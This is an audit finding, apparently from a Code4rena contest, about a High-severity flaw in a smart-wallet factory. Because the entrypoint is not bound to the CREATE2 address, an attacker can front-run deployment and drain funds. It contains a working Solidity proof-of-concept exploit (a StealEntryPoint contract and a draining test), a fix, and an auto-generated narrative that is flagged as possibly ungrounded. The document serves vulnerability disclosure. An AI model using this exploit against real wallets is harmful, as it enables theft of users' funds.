---
id: 17939
severity: "High"
---

# Attacker can gain control of counterfactual wallet

## Description

A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.

However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:

    ```solidity
    function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){
        bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));
        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));
        // solhint-disable-next-line no-inline-assembly
        assembly {
            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
        }
        require(address(proxy) != address(0), "Create2 call failed");
        // EOA + Version tracking
        emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);
        BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);
        isAccountExist[proxy] = true;
    }
    ```

As the entrypoint address doesn’t take any role in the address generation (it isn’t part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.

## Proof of Concept

In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet.
    
    ```solidity
    contract StealEntryPoint {
        function steal(SmartAccount wallet) public {
            uint256 balance = address(wallet).balance;
    
            wallet.execFromEntryPoint(
                msg.sender, // address dest
                balance, // uint value
                "", // bytes calldata func
                Enum.Operation.Call, // Enum.Operation operation
                gasleft() // uint256 gasLimit
            );
        }
    }
    
    contract AuditTest is Test {
        bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;
    
        uint256 bobPrivateKey = 0x123;
        uint256 attackerPrivateKey = 0x456;
    
        address deployer;
        address bob;
        address attacker;
        address entrypoint;
        address handler;
    
        SmartAccount public implementation;
        SmartAccountFactory public factory;
        MockToken public token;
    
        function setUp() public {
            deployer = makeAddr("deployer");
            bob = vm.addr(bobPrivateKey);
            attacker = vm.addr(attackerPrivateKey);
            entrypoint = makeAddr("entrypoint");
            handler = makeAddr("handler");
    
            vm.label(deployer, "deployer");
            vm.label(bob, "bob");
            vm.label(attacker, "attacker");
    
            vm.startPrank(deployer);
            implementation = new SmartAccount();
            factory = new SmartAccountFactory(address(implementation));
            token = new MockToken();
            vm.stopPrank();
        }
        
        function test_SmartAccountFactory_StealCounterfactualWallet() public {
            uint256 index = 0;
            address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);
            // Simulate Bob sends 1 ETH to the wallet
            uint256 amount = 1 ether;
            vm.deal(counterfactualWallet, amount);
    
            // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)
            vm.startPrank(attacker);
    
            StealEntryPoint stealer = new StealEntryPoint();
    
            address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);
            SmartAccount wallet = SmartAccount(payable(proxy));
    
            // address is the same
            assertEq(address(wallet), counterfactualWallet);
    
            // trigger attack
            stealer.steal(wallet);
    
            vm.stopPrank();
    
            // Attacker has stolen the funds
            assertEq(address(wallet).balance, 0);
            assertEq(attacker.balance, amount);
        }
    }
    ```

## Recommendation

This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.

[#278](https://github.com/code-423n4/2023-01-biconomy-findings/issues/278) also described a way to make the user tx not revert by self destructing with another call. i.e.

  1. Frontrun deploy
  2. Set approval and selfdestruct
  3. User deploy, no revert

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability concerns a deterministic counterfactual wallet created by the SmartAccountFactory where the address is pre‑computed using CREATE2 with a salt that only incorporates the owner address and an index. Because the entrypoint parameter is supplied later to the init function and is not part of the salt or the creation code hash, the same address can be deployed with any arbitrary entrypoint. An attacker can therefore front‑run the legitimate user by deploying the wallet first, choosing a malicious entrypoint contract, and then invoking the wallet’s execFromEntryPoint function to transfer any ether that was sent to the pre‑generated address. This attack works whenever a user relies on the pre‑generated address to receive funds before the wallet is actually deployed, assuming the entrypoint is not validated during address generation. The impact is that the user’s funds disappear from the expected wallet address and are transferred to the attacker, breaking the accounting assumptions that the wallet will hold the deposited balance. The issue was discovered during a security audit that included a proof‑of‑concept test where the attacker funded the counterfactual address, deployed the wallet with a custom StealEntryPoint, and successfully drained the balance. The bug is subtle because the address appears correct and the deployment transaction does not revert, making it easy to miss in normal testing. From a user’s perspective the wallet shows a zero balance after deployment even though they previously sent ether, violating the expectation that the wallet will retain the funds. This class of bug is an insecure deterministic address generation where a critical parameter (the entrypoint) is not bound to the address, enabling takeover and fund theft. The recommended mitigation is to bind the entrypoint to the address computation, for example by including it in the CREATE2 salt or in the init code hash, and to enforce that the same entrypoint is used during deployment, thereby preventing an attacker from substituting a malicious entrypoint.
